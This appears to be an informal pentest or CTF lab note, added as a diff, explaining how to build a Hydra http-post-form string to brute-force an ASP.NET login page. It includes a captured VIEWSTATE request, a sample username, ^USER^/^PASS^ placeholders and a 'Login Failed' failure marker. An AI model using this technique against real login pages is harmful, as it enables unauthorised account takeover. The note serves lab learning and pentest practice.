@@ -1,0 +1,18 @@
+so, this can be a bit diffucult, esp without pictures, so i shall try to describe how to do it to the best of my ability;
+
+first, grab the post request. it should start with /, remove the POST, HTTP and URLencoding  beforehand, so this:
+POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
+
+would turn into this:
+http-post-form '/Account/login.aspx?ReturnURL=/admin'
+
+then, you need to concacenate with other features, so we need to add a user and pass for hydra to brute force. in my face, its quite a fat string.
+its in this thing called VIEWSTATE, but it applies however the user and password are inputted.
+you need to add a : to sepetate the request from the user and pass. so:
+
+http-post-form '/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=YibkY9dd351MMEzJD26%2BJu7y5adSMquwxE8tkw1AhwScEBcL893UXZyT3F4HJAK2%2Fr%2FwBSFQZWSm%2F8Sx9Fe2T6R%2FY13aAzz%2FtQS1POSsfOLmEHdIuN0VOjKotKbMfzk1BBNIqkEo%2Bqyvt2bcRzlp5nHGY9uSkmfOG06pYQhVcql%2BtKai0mX88KoAGvDu8kqO2%2BVjJGjW4oENbI%2BYEYUW%2FcWCQKeSpoIub5hFQQbjG865pMul5ZRJ0UkPzvTtPONyiS3HUNKd3mEl6SILwu4UeEScofIqi8GOAUoC0q6nHiDmiFs3xEtlRGnhqckgjLLio4bTF0I%2B36ytPvyJPxzhYC%2BAzlo6w9JN988DChmdcZGfgcju&__EVENTVALIDATION=NDPTS6txTVEeFWzDvMSKtOm8SOXjHyEn6tw%2FNLmUtZFvaKD5v3wkhr7lCjk%2ByVfNO1ROkNPMzPOCiv9QnRmufbD4rRxCFi%2FU1uJFw8h8CfAK2CiFrdkagf2uDrZVBuorN9ZbZkLxXmWFukbwRue%2FQCxGQTn735N9TMa12fa0eWxfb%2Fcw&ctl00%24MainContent%24LoginUser%24UserName=pennywise&ctl00%24MainContent%24LoginUser%24Password=a&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
+now, we need to add an error message to finalise the concacenation of the string to know what its like to get an error.
+
+For this one, it can just be ":Login Failed" but this might need to be adapter per pentest. you can also filter through HTTP codes, or content length.
+
+also remember to change the usernames and passwords to ^USER^ and ^PASS^.
